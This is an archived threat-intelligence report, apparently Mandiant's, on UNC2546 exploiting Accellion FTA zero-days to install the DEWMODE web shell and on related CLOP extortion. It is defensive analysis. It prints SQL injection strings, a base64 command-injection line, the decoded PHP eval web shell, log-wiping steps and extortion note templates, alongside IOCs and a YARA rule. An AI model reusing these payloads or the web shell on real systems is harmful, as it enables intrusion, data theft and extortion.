{
    "id": "76cea6f0-e26d-4c1e-816b-fba32d6a3575",
    "created_at": "2023-01-12T14:59:03.179275Z",
    "updated_at": "2025-03-27T02:16:09.674552Z",
    "deleted_at": null,
    "sha1_hash": "238a113826e28191f9d02554d9406f05448b6aec",
    "title": "2021-02-22 - Cyber Criminals Exploit Accellion FTA for Data Theft and Extortion",
    "authors": "",
    "file_creation_date": "2022-05-28T16:12:43Z",
    "file_modification_date": "2022-05-28T16:12:43Z",
    "file_size": 122402,
    "plain_text": "# Cyber Criminals Exploit Accellion FTA for Data Theft and Extortion\n\n**[fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html](https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html)**\n\nThreat Research\n\nAndrew Moore, Genevieve Stark, Isif Ibrahima, Van Ta, Kimberly Goody\n\nFeb 22, 2021\n\n12 mins read\n\nRansomware\n\nThreat Research\n\nUncategorized Groups (UNC Groups)\n\nStarting in mid-December 2020, malicious actors that Mandiant tracks as UNC2546 exploited multiple zero-day\nvulnerabilities in Accellion’s legacy File Transfer Appliance (FTA) to install a newly discovered web shell named\nDEWMODE. The motivation of UNC2546 was not immediately apparent, but starting in late January 2021, several\norganizations that had been impacted by UNC2546 in the prior month began receiving extortion emails from actors\nthreatening to publish stolen data on the “CL0P^_- LEAKS\" .onion website. Some of the published victim data appears to\nhave been stolen using the DEWMODE web shell.\n\nNotably, the number of victims on the “CL0P^_- LEAKS\" shaming website has increased in February 2021 with\norganizations in the United States, Singapore, Canada, and the Netherlands recently outed by these threat actors.\n[Mandiant has previously reported that FIN11 has threatened to post stolen victim data on this same .onion site as an](https://www.fireeye.com/resources/fin11-email-campaigns-precursor-for-ransomware-data-theft)\nadditional tactic to pressure victims into paying extortion demands following the deployment of CLOP ransomware.\nHowever, in recent CLOP extortion incidents, no ransomware was deployed nor were the other hallmarks of FIN11\npresent.\n\n\n-----\n\nWe are currently tracking the exploitation of the zero day Accellion FTA vulnerabilities and data theft from companies\nrunning the legacy FTA product as UNC2546, and the subsequent extortion activity as UNC2582. We have identified\noverlaps between UNC2582, UNC2546, and prior FIN11 operations, and we will continue to evaluate the relationships\nbetween these clusters of activity. For more information on our use of ‘UNC’ designations, see our blog post,\n[\"DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors.\"](https://www.mandiant.com/resources/how-mandiant-tracks-uncategorized-threat-actors)\n\nMandiant has been working closely with Accellion in response to these matters and will be producing a complete\n[security assessment report in the coming weeks. At this time, Accellion has patched all FTA vulnerabilities known to be](https://www.accellion.com/company/press-releases/accellion-provides-update-to-recent-fta-security-incident/)\nexploited by the threat actors and has added new monitoring and alerting capabilities to flag anomalies associated with\nthese attack vectors. Mandiant has validated these patches. Mandiant is currently performing penetration testing and\ncode review of the current version of the Accellion FTA product and has not found any other critical vulnerabilities in the\nFTA product based on our analysis to date. Accellion customers using the FTA legacy product were the targets of the\nattack.\n\nAccellion FTA is a 20-year-old product nearing end of life. Accellion strongly recommends that FTA customers migrate to\nkiteworks, Accellion’s [enterprise content firewall platform. Per Accellion, Kiteworks is built on an entirely different code](https://www.accellion.com/)\nbase.\n\nThe following CVEs have since been reserved for tracking the recently patched Accellion FTA vulnerabilities:\n\n[CVE-2021-27101 - SQL injection via a crafted Host header](https://nvd.nist.gov/vuln/detail/CVE-2021-27101)\n[CVE-2021-27102 - OS command execution via a local web service call](https://nvd.nist.gov/vuln/detail/CVE-2021-27102)\n[CVE-2021-27103 - SSRF via a crafted POST request](https://nvd.nist.gov/vuln/detail/CVE-2021-27103)\n[CVE-2021-27104 - OS command execution via a crafted POST request](https://nvd.nist.gov/vuln/detail/CVE-2021-27104)\n\n**UNC2546 and DEWMODE**\n\nIn mid-December 2020, Mandiant responded to multiple incidents in which a web shell we call DEWMODE was used to\nexfiltrate data from Accellion FTA devices. The Accellion FTA device is a purpose-built application designed to allow an\nenterprise to securely transfer large files. The exfiltration activity has affected entities in a wide range of sectors and\ncountries.\n\nAcross these incidents, Mandiant observed common infrastructure usage and TTPs, including exploitation of FTA\ndevices to deploy the DEWMODE web shell. Mandiant determined that a common threat actor we now track as\nUNC2546 was responsible for this activity. While complete details of the vulnerabilities leveraged to install DEWMODE\nare still being analyzed, evidence from multiple client investigations has shown multiple commonalities in UNC2546's\nactivities.\n\n**Evidence of Exploitation and DEWMODE Installation**\n\nMandiant has been able reconstruct many of the details about how Accellion FTAs have been compromised through\nexamination of Apache and system logs from impacted devices—from initial compromise, to deployment of DEWMODE,\nand follow-on interaction.\n\nThe earliest identification of activity associated with this campaign occurred in mid-December 2020. At this time,\nMandiant identified UNC2546 leveraging an SQL injection vulnerability in the Accellion FTA. This SQL injection served\nas the primary intrusion vector.\n\nMandiant observed evidence of SQL injection followed by subsequent requests to additional resources, as shown in\nFigure 1.\n\n\n-----\n\n[.'))union(select(c_value)from(t_global)where(t_global.c_param)=('w1'))#/sid#935ee00][rid#9700968/initial] (1) pass\nthrough /courier/document_root.html\n\n['))union(select(loc_id)from(net1.servers)where(proximity)=(0))#/sid#935ee00][rid#9706978/initial] (1) pass through\n/courier/document_root.html\n\n[.'))union(select(reverse(c_value))from(t_global)where(t_global.c_param)=('w1'))#/sid#935ee00][rid#971c098/initial]\n(1) pass through /courier/document_root.html\n\n[<redacted>/sid#935ee00][rid#971a090/initial] (1) pass through /courier/sftp_account_edit.php\n\n[<redacted>/sid#935ee00][rid#9706978/initial] (1) pass through /courier/oauth.api\n\n[<redacted>/sid#935ee00][rid#9708980/initial] (1) pass through /courier/oauth.api\n\nFigure 1: SQL injection log\n\nUNC2546 has leveraged this SQL injection vulnerability to retrieve a key which appears to be used in conjunction with a\nrequest to the file sftp_account_edit.php. Immediately after this request, the built-in Accellion utility admin.pl was\nexecuted, resulting in an eval web shell being written to oauth.api.\n\nPWD=/home/seos/courier ; USER=root ; COMMAND=/usr/local/bin/admin.pl --edit_user=F\n\n--mount_cifs=\nV,DF,$(echo${IFS}PD9waHAKCmlmKGlzc2V0KCRfUkVRVUVTVFsndG9rZW4nXSkpCnsKICAgIGV2YWwoYm\n\nFzZTY0X2RlY29kZSgkX1JFUVVFU1RbJ3Rva2VuJ10pKTsKfQplbHNlIGlmKGlzc2V0KCRfUkVRVUVTVFsnd\n\nXNlcm5hbWUnXSkpCnsKICAgIHN5c3RlbSgkX1JFUVVFU1RbJ3VzZXJuYW1lJ10pOwp9CmVsc2UKewogICAgaG\n\nVhZGVyKCdMb2NhdGlvbjogLycpOwp9|base64${IFS}-d|tee${IFS}/home/seos/courier/oauth.api);FUK;\",PASSWORD #\n\\\" --passwd=pop\n\nFigure 2: Excerpt from log showing creation of eval web shell\n\nThe decoded contents are shown in Figure 3.\n\n<?php\n\nif(isset($_REQUEST['token']))\n\n{\neval(base64_decode($_REQUEST['token']));\n\n}\nelse if(isset($_REQUEST['username']))\n\n{\nsystem($_REQUEST['username']);\n\n}\nelse\n{\nheader('Location: /');\n\n}\n\nFigure 3: Decoded eval web shell\n\nAlmost immediately following this sequence, the DEWMODE web shell is written to the system. The timing of these\nrequests suggests that DEWMODE was delivered via the oauth.api web shell; however, the available evidence does not\nindicate the exact mechanism used to write DEWMODE to disk.\n\nMandiant has identified the DEWMODE web shell in one of the following two locations:\n\n/home/seos/courier/about.html\n/home/httpd/html/about.html\n\n\n-----\n\nThe DEWMODE web shell (Figure 4) extracts a list of available files from a MySQL database on the FTA and lists those\nfiles and corresponding metadata—file ID, path, filename, uploader, and recipient—on an HTML page. UNC2546 then\nuses the presented list to download files through the DEWMODE web shell. Download requests are captured in the\nFTA’s web logs, which will contain requests to the DEWMODE web shell with encrypted and encoded URL parameters,\nwhere dwn is the file path and fn is the requested file name (Figure 5). The encrypted file path and name values visible\nin web logs can be decrypted using key material obtained from the database used by the targeted FTA. Given the\ncomplex nature of this process, if your organization needs assistance reviewing relevant logs, please contact Mandiant\nor Accellion.\n\n\nDEWMODE web shell screenshot\n\n\nFigure 4: DEWMODE web shell\n\nscreenshot\n\nGET /courier/about.html?dwn=[REDACTED]&fn=[REDACTED] HTTP/1.1\" 200 1098240863 \"-\" \"-\" \"-\" TLSv1.2\nECDHE-RSA-AES128-SHA256\n\nFigure 5: DEWMODE File Download URL parameters\n\nFollowing file downloads, UNC2546 initiates a cleanup routine by passing a specific query parameter named csrftoken\nwith the value 11454bd782bb41db213d415e10a0fb3c to DEWMODE. The following actions are performed:\n\nA shell script is written to /tmp/.scr, which will:\n\nRemove all references to about.html from log files located in /var/opt/apache/\nWrite the modified log file to /tmp/x then replace the original log file at /var/opt/apache/\nDelete the contents of the /home/seos/log/adminpl.log log file.\nRemove /home/seos/courier/about.html (DEWMODE) and /home/seos/courier/oauth.api (eval web shell), and\nredirect command output to the file /tmp/.out\nChange the permissions of the output file to be readable, writeable and executable by all users, and set the\nowner to “nobody”\n\n\n-----\n\nDelete the script file /tmp/.scr and other temporarily created files to assist in cleanup\nDisplay cleanup output to the requesting user\n\nAn example of a cleanup request and subsequent execution of the cleanup script can be seen in Figure 6.\n\nGET /courier/about.html?csrftoken=11454bd782bb41db213d415e10a0fb3c HTTP/1.1\" 200 5 \"-\"\n\"https://[REDACTED]//courier/about.html?aid=1000\" \"Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101\n\nsft sudo:  nobody : TTY=unknown ; PWD=/home/seos/courier ; USER=root ; COMMAND=/usr/local/bin/admin.pl -mount_cifs=AF,DF,'$(sh /tmp/.scr)',PASSWORD\n\nFigure 6: DEWMODE cleanup request\n\nMandiant also identified a variant of DEWMODE (bdfd11b1b092b7c61ce5f02ffc5ad55a) which contained minor changes\nto the cleanup operation, including wiping of /var/log/secure and removing about.html and oauth.api from the directories\n/home/httpd/html/ instead of /home/seos/courier/.\n\nIn a subset of incidents, Mandiant observed UNC2546 requesting a file named cache.js.gz (Figure 7). Based on\ntemporal file access to the mysqldump utility and mysql data directories, the archive likely contained a dump of the\ndatabase. With the exception of cache.js.gz, Mandiant has not observed UNC2546 acquiring files from Accellion\nappliances through any method besides DEWMODE.\n\nGET //courier/cache.js.gz HTTP/1.1\" 200 35654360 \"-\" \"-\" \"python-requests/2.24.0\" TLSv1.2 ECDHE-RSA-AES128GCM-SHA256\n\nFigure 7: cache.js.gz file request\n\n**UNC2582 Data Theft Extortion**\n\nShortly after installation of the web shell, in multiple cases within hours, UNC2546 leveraged DEWMODE to download\nfiles from compromised FTA instances. While the actors’ motivations were not immediately clear, several weeks after\ndelivery of the DEWMODE web shell, victims began to receive extortion emails from an actor claiming association with\nthe CLOP ransomware team (Figure 8 and Figure 9). The actors threatened to publish data on the \"CL0P^_- LEAKS\"\n.onion shaming website, unless the victim paid an extortion fee. We are tracking the subsequent extortion activity under\na separate threat cluster, UNC2582. Despite tracking the exploitation and extortion activity in separate threat clusters we\nhave observed at least one case where an actor interacted with a DEWMODE web shell from a host that was used to\nsend UNC2582-attributed extortion email.\n\nHello!\n\nYour network has been hacked, a lot of valuable data stolen. <description of stolen data, including the total size of the\ncompressed files> We are the CLOP ransomware team, you can google news and articles about us. We have a\nwebsite where we publish news and stolen files from companies that have refused to cooperate. Here is his address\nhttp://[redacted].onion/ - use TOR browser or http://[redacted].onion.dog/ - mirror. We are visited by 20-30 thousand\njournalists, IT experts, hackers and competitors every day. We suggest that you contact us via chat within 24 hours to\ndiscuss the current situation. <victim-specific negotiation URL> - use TOR browser We don't want to hurt, our goal is\nmoney. We are also ready to provide any evidence of the presence of files with us.\n\nFigure 8: Extortion Note Template 1\n\n\n-----\n\nThis is the last warning!\n\nIf you don’t get in touch today, tomorrow we will create a page with screenshots of your files (like the others on our\nsite), send messages to all the emails that we received from your files. Due to the fact that journalists and hackers\nvisit our site, calls and questions will immediately begin, online publications will begin to publish information about the\nleak, you will be asked to comment.\n\nDo not let this happen, write to us in chat or email and we will discuss the situation!\n\nCHAT: <victim-specific negotiation URL>\n\nEMAIL: unlock@support-box.com\n\nUSE TOR BROWSER!\n\nFigure 9: Extortion Note Template 2\n\nBased on observations at several engagements, UNC2582 appears to follow a pattern of escalation to pressure victims\ninto paying extortion demands. Initial emails are sent from a free email account, likely unique per victim, to a seemingly\nlimited distribution of addresses at the victim organization. If the victim does not respond in a timely manner, additional\nemails are sent to a much larger number of recipients from hundreds or thousands of different email accounts and using\nvaried SMTP infrastructure. In at least one case, UNC2582 also sent emails to partners of the victim organization that\nincluded links to the stolen data and negotiation chat. Monitoring of the CL0P^_- LEAKS shaming website has\ndemonstrated that UNC2582 has followed through on threats to publish stolen data as several new victims have\nappeared on the site in recent weeks, including at least one organization that has publicly confirmed that their Accellion\nFTA device had been recently targeted.\n\n**Key Overlaps With FIN11**\n\n_UNC2582 (Extortion) and FIN11_\n\n[Mandiant identified overlaps between UNC2582’s data theft extortion activity and prior FIN11 operations, including](https://www.fireeye.com/blog/threat-research/2020/10/fin11-email-campaigns-precursor-for-ransomware-data-theft.html)\ncommon email senders and the use of the CL0P^_- LEAKS shaming site. While FIN11 is known for deploying CLOP\nransomware, we have previously observed the group conduct data theft extortion without ransomware deployment,\nsimilar to these cases.\n\nSome UNC2582 extortion emails observed in January 2021 were sent from IP addresses and/or email accounts\nused by FIN11 in multiple phishing campaigns between August and December 2020, including some of the last\ncampaigns that were clearly attributable to the group.\nWe have not observed FIN11 phishing activity in the new year. FIN11 has typically paused their phishing\noperations over the winter holidays and had several extended gaps in their operations. However, the timing of this\ncurrent hiatus is also consistent with UNC2582’s data theft extortion activity.\nUNC2582 extortion emails contained a link to the CL0P^_- LEAKS website and/or a victim specific negotiation\npage. The linked websites were the same ones used to support historical CLOP operations, a series of\nransomware and data theft extortion campaigns we suspect can be exclusively attributed to FIN11.\n\n_UNC2546 (FTA Exploitation and DEWMODE) and FIN11_\n\nThere are also limited overlaps between FIN11 and UNC2546.\n\nMany of the organizations compromised by UNC2546 were previously targeted by FIN11.\nAn IP address that communicated with a DEWMODE web shell was in the \"Fortunix Networks L.P.\" netblock, a\nnetwork frequently used by FIN11 to host download and FRIENDSPEAK command and control (C2) domains.\n\n**Implications**\n\nThe overlaps between FIN11, UNC2546, and UNC2582 are compelling, but we continue to track these clusters\nseparately while we evaluate the nature of their relationships. One of the specific challenges is that the scope of the\noverlaps with FIN11 is limited to the later stages of the attack life cycle. UNC2546 uses a different infection vector and\n\n\n-----\n\nfoothold, and unlike FIN11, we have not observed the actors expanding their presence across impacted networks. We\ntherefore have insufficient evidence to attribute the FTA exploitation, DEWMODE, or data theft extortion activity to\nFIN11. Using SQL injection to deploy DEWMODE or acquiring access to a DEWMODE shell from a separate threat actor\nwould represent a significant shift in FIN11 TTPs, given the group has traditionally relied on phishing campaigns as its\ninitial infection vector and we have not previously observed them use zero-day vulnerabilities.\n\n**Acknowledgements**\n\nDavid Wong, Brandon Walters, Stephen Eckels and Jon Erickson\n\n**Indicators of Compromise (IOCs)**\n\n_DEWMODE Web Shells_\n\n**MD5** **SHA256**\n\n2798c0e836b907e8224520e7e6e4bb42 5fa2b9546770241da7305356d6427847598288290866837626f621d794692c1b\n\nbdfd11b1b092b7c61ce5f02ffc5ad55a 2e0df09fa37eabcae645302d9865913b818ee0993199a6d904728f3093ff48c7\n\n_UNC2546 Source IP Addresses_\n\nThe following source IP addresses were observed in multiple UNC2546 intrusions:\n\n45.135.229.179\n79.141.162.82\n155.94.160.40\n192.154.253.120\n192.52.167.101\n194.88.104.24\n\n**Detections**\n\n_FireEye Detections_\n\nFE_Webshell_PHP_DEWMODE_1\nFEC_Webshell_PHP_DEWMODE_1\nWebshell.PHP.DEWMODE\n\n_Mandiant Security Validation_\n\nA101-515 Malicious File Transfer - DEWMODE Webshell, Upload, Variant #1\nA101-516 Malicious File Transfer - DEWMODE Webshell, Upload, Variant #2\n\n_DEWMODE YARA Rule_\n\nThe following YARA rule is not intended to be used on production systems or to inform blocking rules without first being\nvalidated through an organization's own internal testing processes to ensure appropriate performance and limit the risk\nof false positives. This rule is intended to serve as a starting point for hunting efforts to identify DEWMODE payloads;\nhowever, it may need adjustment over time if the malware family changes.\n\n\n-----\n\nrule DEWMODE_PHP_Webshell\n\n{\nstrings:\n$s1 = /if \\(isset\\(\\$_REQUEST\\[[\\x22\\x27]dwn[\\x22\\x27]]\\)[\\x09\\x20]{0,32}&&[\\x09\\x20]{0,32}isset\\(\\$_REQUEST\\\n\n[[\\x22\\x27]fn[\\x22\\x27]\\]\\)\\)\\s{0,256}\\{/\n\n$s2 = \"<th>file_id</th>\"\n\n$s3 = \"<th>path</th>\"\n\n$s4 = \"<th>file_name</th>\"\n\n$s5 = \"<th>uploaded_by</th>\"\n\n$s6 = \"target=\\\\\\\"_blank\\\\\\\">Download</a></td>\"\n\n$s7 = \"Content-Type: application/octet-stream\"\n\n$s8 = \"Content-disposition: attachment; filename=\"\n\ncondition:\n\nall of them\n\n}\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-22 - Cyber Criminals Exploit Accellion FTA for Data Theft and Extortion.pdf"
    ],
    "report_names": [
        "2021-02-22 - Cyber Criminals Exploit Accellion FTA for Data Theft and Extortion.pdf"
    ],
    "threat_actors": [
        {
            "id": "6728f306-6259-4e7d-a4ea-59586d90a47d",
            "created_at": "2023-01-06T13:46:39.175292Z",
            "updated_at": "2025-03-27T02:00:03.013291Z",
            "deleted_at": null,
            "main_name": "FIN11",
            "aliases": [
                "TEMP.Warlock",
                "UNC902"
            ],
            "source_name": "MISPGALAXY:FIN11",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "1db21349-11d6-4e57-805c-fb1e23a8acab",
            "created_at": "2022-10-25T16:07:23.630365Z",
            "updated_at": "2025-03-27T02:02:09.897138Z",
            "deleted_at": null,
            "main_name": "FIN11",
            "aliases": [
                "DEV-0950",
                "Lace Tempest",
                "Operation Cyclone"
            ],
            "source_name": "ETDA:FIN11",
            "tools": [
                "AZORult",
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "BLUESTEAL",
                "Cl0p",
                "EMASTEAL",
                "FLOWERPIPE",
                "FORKBEARD",
                "FRIENDSPEAK",
                "FlawedAmmyy",
                "GazGolder",
                "Get2",
                "GetandGo",
                "JESTBOT",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MINEDOOR",
                "MIXLABEL",
                "Meterpreter",
                "NAILGUN",
                "POPFLASH",
                "PuffStealer",
                "Rultazo",
                "SALTLICK",
                "SCRAPMINT",
                "SHORTBENCH",
                "SLOWROLL",
                "SPOONBEARD",
                "TiniMet",
                "TinyMet",
                "VIDAR",
                "Vidar Stealer"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535543,
    "ts_updated_at": 1743041769,
    "ts_creation_date": 1653754363,
    "ts_modification_date": 1653754363,
    "files": {
        "pdf": "https://archive.orkl.eu/238a113826e28191f9d02554d9406f05448b6aec.pdf",
        "text": "https://archive.orkl.eu/238a113826e28191f9d02554d9406f05448b6aec.txt",
        "img": "https://archive.orkl.eu/238a113826e28191f9d02554d9406f05448b6aec.jpg"
    }
}